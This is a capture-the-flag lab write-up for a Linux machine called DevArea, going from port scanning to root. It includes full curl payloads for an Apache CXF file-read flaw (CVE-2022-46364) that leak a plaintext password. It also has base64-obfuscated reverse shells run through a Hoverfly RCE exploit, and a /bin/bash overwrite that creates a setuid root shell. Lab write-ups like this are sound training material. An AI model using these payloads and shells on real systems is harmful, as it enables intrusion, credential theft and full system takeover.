# DevArea

**Target IP:** `10.129.244.208`  
**Hostname:** `devarea.htb`  
**Platform:** `Linux`  
**Difficulty:** `Medium`

---

## 1. Enumeration

### Port Scan

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy?
8500/tcp open  fmtp?
8888/tcp open  sun-answerbook?
```

This is a lot of ports, with the common ssh and web (port 22 and 80 respectively) but there is also an FTP service, as well as three ports 8080, 8500 and 8888 which will require further fingerprinting.

### Web Reconnaissance

Viewing the website, it seems to be some form of recruiting site for developers to both find jobs and for companies to find developers: ![Pasted image 20260402132432](Screenshots/Pasted%20image%2020260402132432.png)

None of the buttons on the site seem to lead anywhere. Viewing a 404 error page, leaks that Apache 2.4.58 is in use: ![Pasted image 20260402132626](Screenshots/Pasted%20image%2020260402132626.png)

Directory fuzzing:

```bash
feroxbuster --url http://devarea.htb/
```

This returns nothing of note: ![Pasted image 20260402132923](Screenshots/Pasted%20image%2020260402132923.png)

Subdomain / vhost enumeration:

```bash
ffuf -c -u http://10.129.244.208 -H "Host: FUZZ.devarea.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 302
```

This doesn't find any subdomains, suggesting the http server may be a dead end for the time being.

### FTP Enumeration

When connecting initially to the FTP server with a dummy username, it states "This FTP server is anonymous only." This also shows that vsFTPd 3.0.5 is in use: ![Pasted image 20260402133148](Screenshots/Pasted%20image%2020260402133148.png)

Suggesting we might be able to connect anonymously. Attempting this works:

```bash
ftp anonymous@devarea.htb
```

Inside the ftp share is a single folder `pub` with a single `.jar` file called `employee-service.jar`, which I download for later analysis: ![Pasted image 20260402133335](Screenshots/Pasted%20image%2020260402133335.png)

### Additional Fingerprinting

At this stage I suspect the `.jar` file is the way forward, however to avoid rabbit-holes I want to properly enumerate the other services. There are 3 ports - 8080, 8500 and 8888.

#### Port 8080

Running a stronger nmap scan, with the `-sV` flag shows that this site is running `Jetty 9.4.27.v20200227` and is an http server.

Viewing this in the browser shows a 404 error, also disclosing Jetty is in use: ![Pasted image 20260402134821](Screenshots/Pasted%20image%2020260402134821.png)

I will perform subdirectory enumeration on this:

```bash
feroxbuster --url http://devarea.htb:8080/
```

And subdomain enumeration:

```bash
ffuf -c -u http://10.129.244.208:8080 -H "Host: FUZZ.devarea.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
```

Both return nothing.

#### Port 8500

Scanning port 8500 with nmap, returns a slightly garbled response signifying it _might_ be a golang http server. Visiting the port directly we get the following message: ![Pasted image 20260402135234](Screenshots/Pasted%20image%2020260402135234.png)

I try using the proxy to connect to one of the web servers, but it fails, requiring authentication: ![Pasted image 20260402142145](Screenshots/Pasted%20image%2020260402142145.png)

#### Port 8888

Finally, scanning this port with nmap, shows that it is likely a golang http server with either `(Go-IPFS json-rpc or InfluxDB API)`.

Visiting this port directly in the browser we get another web page **Hoverfly** with a login page, documentation and a github, suggesting this is an off the shelf product: ![Pasted image 20260402135454](Screenshots/Pasted%20image%2020260402135454.png)

I will perform subdirectory enumeration on this:

```bash
feroxbuster --url http://devarea.htb:8888/
```

And subdomain enumeration:

```bash
ffuf -c -u http://10.129.244.208:8888 -H "Host: FUZZ.devarea.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 32
```

Similarly to before, these both return nothing.

As this is an open source product, I performed a quick google search and observed a CVE (CVE-2025-54123) in versions 1.11.3 and below for authenticated RCE, which may be useful later.

---

## 2. Jar analysis

At this stage I have a good understanding of all the services running and have identified a potential RCE exploit if we can gain access to the hoverfly application and the version number is applicable. Now, I believe the next step is to analyse the jar file we found in the ftp server.

### Analysis

To analyse the jar file I use `jd-gui`

Digging into the files, we notice this appears to be the code for the server running on port 8080, and it gives hints to some potentially useful endpoints: ![Pasted image 20260402140246](Screenshots/Pasted%20image%2020260402140246.png)

This appears to be a few simple SOAP APIs that are used for submitting reports, we can view the documentation for the APIs at `http://devarea.htb:8080/employeeservice?wsdl`: ![Pasted image 20260402140438](Screenshots/Pasted%20image%2020260402140438.png)

As these are SOAP XML APIs I attempt some XXE/XML injection but to no avail: ![Pasted image 20260402141252](Screenshots/Pasted%20image%2020260402141252.png)

At this stage I have an AI agent analyse the code for me, which extracts that Apache CXF 3.2.14 is in use which is vulnerable to CVE-2022-46364. We can confirm this version of apache is in use by looking at the pom.xml: ![Pasted image 20260402143329](Screenshots/Pasted%20image%2020260402143329.png)

### CVE-2022-46364

This CVE is related to a vulnerability in the href attribute of XOP:include in versions of Apache CXF before 3.4.10, and allows SSRF or LFI.

We can test this by using the following to read `/etc/passwd`:

```bash
curl -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@exploit>"; start-info="text/xml"; boundary="MIMEBoundary"' \
  -H 'SOAPAction: ""' \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@exploit>\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <tns:submitReport>\r\n      <arg0>\r\n        <confidential>false</confidential>\r\n        <content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></content>\r\n        <department>IT</department>\r\n        <employeeName>test</employeeName>\r\n      </arg0>\r\n    </tns:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
```

This returns a base64 encoded `/etc/passwd`: ![Pasted image 20260402143615](Screenshots/Pasted%20image%2020260402143615.png)

Which decodes to: ![Pasted image 20260402143652](Screenshots/Pasted%20image%2020260402143652.png)

Key users here are `dev_ryan` and `root`.

Now we have lfi, my next target is getting credentials to access the hoverfly web server, which is the only other server we can log in to.

I want to gain more info about the server, so I read `/proc/self/environ`:

```bash
curl -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@exploit>"; start-info="text/xml"; boundary="MIMEBoundary"' \
  -H 'SOAPAction: ""' \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@exploit>\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <tns:submitReport>\r\n      <arg0>\r\n        <confidential>false</confidential>\r\n        <content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///proc/self/environ"/></content>\r\n        <department>IT</department>\r\n        <employeeName>test</employeeName>\r\n      </arg0>\r\n    </tns:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
```

Which gives:

```
LANG=en_US.UTF-8.PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin.USER=dev_ryan.LOGNAME=dev_ryan.HOME=/home/dev_ryan.SHELL=/bin/bash.INVOCATION_ID=cb276c6e151543b0a19c86927fcf6d0c.JOURNAL_STREAM=8:18356.SYSTEMD_EXEC_PID=1453.MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/employee-service.service/memory.pressure.MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=.JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64.
```

This tells us we are running as dev_ryan, but not much more than this.

I try many different LFI locations at this point, before eventually stumbling upon some documentation stating that if Hoverfly is running as a systemd service, the config may be at `/etc/systemd/system/hoverfly.service

```bash
curl -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@exploit>"; start-info="text/xml"; boundary="MIMEBoundary"' \
  -H 'SOAPAction: ""' \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@exploit>\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <tns:submitReport>\r\n      <arg0>\r\n        <confidential>false</confidential>\r\n        <content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/systemd/system/hoverfly.service"/></content>\r\n        <department>IT</department>\r\n        <employeeName>test</employeeName>\r\n      </arg0>\r\n    </tns:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
```

This gives us a config file and some credentials:

```
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

**admin**:**O7IJ27MyyXiU**

---

## 3. Hoverfly RCE - CVE-2025-54123

With the credentials gained prior, we are able to login to the application. On the dashboard of the site, we can see the site is running Hoverfly 1.11.3. As identified earlier, this version is vulnerable to CVE-2025-54123, an authenticated RCE affecting the middleware API endpoint.

**PoC**: https://github.com/davidzzo23/CVE-2025-54123

### Testing RCE

Using the github PoC -

```bash
python3 CVE-2025-54123.py -u admin -p O7IJ27MyyXiU -t http://devarea.htb:8888 -c whoami
```

And we get the expected output: ![Pasted image 20260402145232](Screenshots/Pasted%20image%2020260402145232.png)

### Gaining a shell

I first set up a penelope listener, and then modify the payload to execute a simple bash reverse shell:

```bash
python3 CVE-2025-54123.py -u admin -p O7IJ27MyyXiU -t http://devarea.htb:8888 -c 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEpICY=|base64 -d|bash'
```

### Shell as dev_ryan

This grants us a shell as dev_ryan and we can grab the user shell: ![Pasted image 20260402145512](Screenshots/Pasted%20image%2020260402145512.png)

---

## 5. Privilege Escalation — [CVE / Technique Name]

### Enumeration

In the home directory there is a file named `syswatch-v1.zip` which is unusual. Checking the sudo permissions for dev_ryan returns: ![Pasted image 20260402160645](Screenshots/Pasted%20image%2020260402160645.png)

We do not have the permissions to view /opt/syswatch but by unzipping `syswatch-v1.zip` we can find `syswatch.sh` and make the assumption that this is the same file we can run as root

### Reviewing the Vulnerable Component

The script is as follows:

```bash
#!/bin/bash
set -euo pipefail

CONFIG_FILE="/opt/syswatch/config/syswatch.conf"
SYSWATCH_USER="syswatch"
PLUGIN_DIR="/opt/syswatch/plugins"
LOG_DIR="/opt/syswatch/logs"
SAFE_PLUGIN_REGEX='^[a-zA-Z0-9_.\-$]+$'
SAFE_LOG_REGEX='^[A-Za-z0-9_.-]+$'
VERSION="1.0.0"
source "$CONFIG_FILE"
RUN_AS_ROOT_PLUGINS=("log_monitor.sh")
LIST_EXCLUDE=("common.sh")

log_message() {
    local msg="$1"
    echo "$(date '+%F %T') - $msg" >> "$LOG_DIR/system.log"
    logger -t syswatch "$msg"
}


start_web() {
    # Reload systemd in case service was just added
    systemctl daemon-reload

    # Check if the service is already active
    if systemctl is-active --quiet syswatch-web.service; then
        echo "[*] SysWatch Web GUI is already running."
        return
    fi

    echo "[*] Starting SysWatch Web GUI service..."
    systemctl enable syswatch-web.service >/dev/null 2>&1
    systemctl start syswatch-web.service

    # Give a small delay for startup
    sleep 2

    if systemctl is-active --quiet syswatch-web.service; then
        echo "[+] SysWatch Web GUI started successfully!"
    else
        echo "[-] Failed to start SysWatch Web GUI."
    fi
}

# Function: stop web GUI
stop_web() {
    if ! systemctl is-active --quiet syswatch-web.service; then
        echo "[*] SysWatch Web GUI is not running."
        return
    fi

    echo "[*] Stopping SysWatch Web GUI service..."
    systemctl stop syswatch-web.service
    echo "[+] SysWatch Web GUI stopped."
}

# Function: restart/reload web GUI
reload_web() {
    if ! systemctl is-active --quiet syswatch-web.service; then
        echo "[*] SysWatch Web GUI is not running. Starting it..."
        start_web
        return
    fi

    echo "[*] Reloading SysWatch Web GUI service..."
    systemctl restart syswatch-web.service
    echo "[+] SysWatch Web GUI reloaded successfully!"
}

# Function: show status
status_web() {
    systemctl status syswatch-web.service --no-pager  --lines=0
}



execute_plugin() {
    local plugin="$1"; shift
    if [ ! $plugin =~ $SAFE_PLUGIN_REGEX ](%20!%20$plugin%20=~%20$SAFE_PLUGIN_REGEX%20); then
        echo "Invalid plugin name" >&2
        return 1
    fi
    local fullpath="$PLUGIN_DIR/$plugin"
    [ ! -f "$fullpath" ] && echo "Plugin not found: $plugin" >&2 && return 1
    log_message "Executing plugin: $plugin $*"
    local run_root=0
    for p in "${RUN_AS_ROOT_PLUGINS[@]}"; do
        if [ "$plugin" = "$p" ]; then
            run_root=1
            break
        fi
    done
    if [ "$run_root" -eq 1 ]; then
        bash "$fullpath" "$@"
    else
        runuser -u "$SYSWATCH_USER" -- bash "$fullpath" "$@"
    fi
}

list_plugins() {
    local files
    files=$(ls -1 "$PLUGIN_DIR" 2>/dev/null | grep -E '^.+\.sh$' || true)
    [ -z "${files:-}" ] && return
    while IFS= read -r f; do
        [ -z "$f" ] && continue
        local skip=0
        for ex in "${LIST_EXCLUDE[@]}"; do
            if [ "$f" = "$ex" ]; then
                skip=1
                break
            fi
        done
        [ "$skip" -eq 1 ] && continue
        echo " - $f"
    done <<< "$files"
}

view_logs() {
    local arg="${1:-}"

    # ---- LIST MODE ----
    if [ "$arg" = "--list" ] || [ "$arg" = "list" ]; then
        local found=0
        for p in "$LOG_DIR"/*.log; do
            [ -e "$p" ] || continue
            [ -L "$p" ] && continue       # skip symlinks in list
            [ -f "$p" ] || continue
            echo " - $(basename "$p")"
            found=1
        done
        [ "$found" -eq 0 ] && echo "[No logs found]"
        return
    fi

    # FILE NAME VALIDATION
    local file="${arg:-system.log}"
    if [ ! "$file" =~ $SAFE_LOG_REGEX ](%20!%20"$file"%20=~%20$SAFE_LOG_REGEX%20); then
        echo "[Invalid log filename]: $file"
        return 1
    fi

    local path="$LOG_DIR/$file"
    if [ -L "$path" ]; then
        local target
        target=$(ls -l "$path" | awk '{print $NF}')

        if [| "$target" == *".."* || "$target" == *"\\"* ](%20"$target"%20==%20*"/"*%20); then
            echo "[Blocked unsafe symlink target]: $file -> $target"
            return 1
        fi

        if [ "$target" =~ ^[A-Za-z0-9_.-](%20"$target"%20=~%20^[A-Za-z0-9_.-); then
            local resolved="$LOG_DIR/$target"
            if [ -f "$resolved" ]; then
                cat "$resolved"
                return
            else
                echo "[Symlink target not found]: $file -> $target"
                return 1
            fi
        fi

        if [ "$target" == /var/log/* ](%20"$target"%20==%20/var/log/*%20); then
            [ -f "$target" ] && cat "$target" && return
            echo "[Symlink target not regular file]: $file -> $target"
            return 1
        fi

        echo "[Refusing unsafe symlink]: $file -> $target"
        return 1
    fi

    if [| "$file" == *".."* ](%20"$file"%20==%20*/*%20); then
        echo "[Blocked unsafe filename]: $file"
        return 1
    fi
    
    if [ -f "$path" ]; then
        cat "$path"
    else
        echo "[Log file not found]: $file"
    fi
}


usage() {
    echo "SysWatch $VERSION"
    echo "Usage: $0 <command> [args]"
    echo "Commands:"
    echo "  web                 Start web GUI"
    echo "  web-stop            Stop web GUI"
    echo "  web-restart         Restart web GUI"
    echo "  web-status          Show web GUI status"
    echo "  plugin <name> [args] Execute plugin"
    echo "  plugins             List available plugins"
    echo "  logs <file>         View log file"
    echo "  logs --list         List available log files"
    echo "  --version           Show version"
    echo "  --help|-h|help      Show this help"
}

main() {
    case "${1:-}" in
        web) start_web ;;
        web-stop) stop_web ;;
        web-restart|web-reload) reload_web ;;
        web-status) status_web ;;
        plugin) shift; execute_plugin "$@" ;;
        plugins) list_plugins ;;
        logs) shift; view_logs "$@" ;;
        --version) echo "$VERSION" ;;
        help|--help|-h) usage ;;
        *)
            usage
            ;;
    esac
}


if [ "$(id -u)" -eq 0 ]; then
    main "$@"
else
    if [ "${1:-}" == "logs" ](%20"${1:-}"%20==%20"logs"%20); then
        main "$@"
    else
        echo "Access denied. Root required for this action." >&2
        exit 1
    fi
fi

```

This script appears to be a web GUI platform that can execute plugins and perform logging. I suspect if we can create a malicious plugin, we might be able to execute this as root.

I play around with this and other ideas around path manipulation with no luck.

### File permissions

Bizarrely, whether misconfigured or otherwise, we have write permission over `/bin/bash`. As `/bin/bash` is called at the top of our syswatch script, we should be able to overwrite this with a malicious binary in order to gain a shell: ![Pasted image 20260402162529](Screenshots/Pasted%20image%2020260402162529.png)

### Exploit PoC

To execute this I create a few steps. Firstly, I need to switch my current shell over to `/bin/sh` so I don't loose it. I repeat the steps above to gain a shell but with `python`, this time not using penelope, and instead using `nc`, as penelope's shell upgrading process was using bash:

```bash
python3 CVE-2025-54123.py -u admin -p O7IJ27MyyXiU -t http://devarea.htb:8888 -c 'echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMiIsNDQ0NSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9zaCIpJw== | base64 -d | /bin/sh'
```

Make a backup of /bin/bash:

```bash
cp /bin/bash /tmp/bashback
```

Then we are going to create a malicious shell in `/tmp/bash`:

```bash
#!/tmp/bashback
# This will create a setuid root shell if executed by root
cp /bin/sh /tmp/root_shell
chmod +s /tmp/root_shell
echo "Exploit executed!"
```

Allow anyone to execute:

```bash
chmod +x /tmp/bashback
chmod +x /tmp/bash
```

Now in the `/bin/sh` shell we can run the following:

Kill all /bin/bash instances:

```bash
killall -9 bash
```

Overwrite the old /bin/bash with our malicious one:

```bash
cp /tmp/bash /bin/bash
```

Run the binary to execute our malicious `/bin/bash`

```bash
sudo /opt/syswatch/syswatch.sh --version
```

After doing all these steps we can elevate to root: ![Pasted image 20260402170104](Screenshots/Pasted%20image%2020260402170104.png)

And get the root flag: ![Pasted image 20260402170134](Screenshots/Pasted%20image%2020260402170134.png)

---

## Summary

|**Step**|**Technique**|
|---|---|
|**Initial access**|**CVE-2022-46364** — LFI in Apache CXF via the `href` attribute of `XOP:include` to read local files.|
|**Credential access**|**File Disclosure** — Reading `/etc/systemd/system/hoverfly.service` via LFI to obtain plaintext credentials for the Hoverfly API.|
|**User shell**|**CVE-2025-54123** — Authenticated Remote Code Execution (RCE) via the Hoverfly middleware API endpoint.|
|**Privilege escalation**|**Binary Hijacking** — Overwriting the writable `/bin/bash` binary with a malicious script to create a SUID root shell.|